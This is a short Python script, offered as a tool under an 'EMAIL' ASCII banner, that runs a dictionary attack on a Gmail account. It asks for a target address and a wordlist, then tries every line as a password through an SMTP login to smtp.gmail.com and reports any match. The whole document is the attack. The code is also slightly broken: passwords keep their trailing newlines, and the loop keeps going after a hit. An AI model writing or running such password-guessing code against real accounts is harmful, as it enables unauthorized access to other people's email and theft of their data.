import smtplib

banner = """
=========================================
 ____   __      __              _   _
|  __| |  \    /  |     /\     |_| | |
| |__  |   \  /   |    /  \     _  | |
|  __| | |\ \/ /| |   /____\   | | | |
| |__  | | \  / | |  / ____ \  | | | |__ 
|____| |_|  \/  |_| /_/    \_\ |_| |____| 

=========================================

"""

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)

smtpserver.ehlo()
smtpserver.starttls()


user = input("[ENTER] enter gmail adress (eg:somone@gmail.com): ")
file = input("[ENTER] enter full path to worlist file (eg: /home/usr/file.txt): ")


f = open(file,"r").readlines()

for password in f:
    try:
        smtpserver.login(user, password)

        print("[GMAIL] Password Found %s" % password)

    except smtplib.SMTPAuthenticationError as e:
        pass